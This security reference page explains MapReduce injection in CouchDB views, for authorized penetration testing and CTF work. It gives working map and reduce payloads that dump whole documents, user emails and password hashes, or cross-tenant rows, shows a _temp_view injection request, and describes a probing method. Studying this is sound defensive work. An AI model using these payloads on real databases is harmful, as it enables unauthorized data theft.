---
title: "MapReduce injection in CouchDB views"
description: "CouchDB map and reduce functions are JavaScript, so an attacker-controlled view definition executes server-side and emit() can leak documents outside the intended scope."
keywords:
  - CouchDB MapReduce injection
  - map function
  - reduce function
  - emit leak
  - view definition
  - secondary index
---

# MapReduce injection

CouchDB secondary indexes are **views**, and a view is a pair of JavaScript functions stored in a design document: a `map` function that `emit`s key/value pairs, and an optional `reduce` function that aggregates them. The query server runs both over documents in the database. When an attacker controls a view definition, or can influence the map/reduce body an application assembles, that JavaScript runs server-side across the data set.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## The map function runs over every document

A map function receives each document and decides what to index:

```json
{
  "views": {
    "leak": {
      "map": "function(doc){ emit(doc._id, doc); }"
    }
  }
}
```

Emitting the whole `doc` as the value means the view materializes a copy of every document, regardless of the fields the application intended to expose. Querying the view returns those values directly:

```http
GET /app/_design/x/_view/leak?include_docs=false HTTP/1.1
```

A map that emits selected sensitive fields is just as effective and cheaper to build:

```javascript
function(doc){
  if (doc.type === "user") {
    emit(doc._id, { email: doc.email, hash: doc.password_hash, role: doc.role });
  }
}
```

Because the map runs server-side with no row-level scoping, there is no per-user filter unless the function itself imposes one. An injected map can drop every conditional the original author added, widening the view to the entire database.

## Crossing intended scope with emit()

The application may intend a view keyed on, say, a tenant identifier so callers only ever read their own rows. An attacker-controlled map ignores that intent:

```javascript
function(doc){
  emit([doc.tenant, doc._id], doc);   // every tenant, every document
}
```

Combined with range parameters on the query (`startkey`, `endkey`), the caller then reads across tenant boundaries. A map can also reach into attachments metadata and `_conflicts` that a narrowly scoped view would never surface:

```javascript
function(doc){ emit(doc._id, { attachments: doc._attachments, conflicts: doc._conflicts }); }
```

## Abusing reduce

The reduce function is also JavaScript and runs with the same reach. A reduce body is injectable in the same way a map body is, and can be used to count or aggregate across the whole set to confirm data exists before extracting it:

```json
{ "views": { "n": { "map": "function(doc){emit(null,1);}", "reduce": "_count" } } }
```

Replacing `_count` with a custom function body executes attacker JavaScript during the reduce phase.

## Temporary and assembled views

Older CouchDB exposed `POST /db/_temp_view` taking a map function in the request body, which is a direct injection sink when reachable:

```http
POST /app/_temp_view HTTP/1.1
Content-Type: application/json

{ "map": "function(doc){ emit(doc._id, doc); }" }
```

Where an application builds a view definition from user input (a field name to index, a filter expression) and concatenates it into the function string, the attacker closes the intended expression and appends their own JavaScript, exactly as with any string-built code sink. Probe by submitting a value that would break the surrounding function syntax and watching for a query-server compilation error in the response.

## References

- [Apache CouchDB: Views and MapReduce](https://docs.couchdb.org/en/stable/ddocs/views/intro.html)
- [Apache CouchDB: View API](https://docs.couchdb.org/en/stable/api/ddoc/views.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
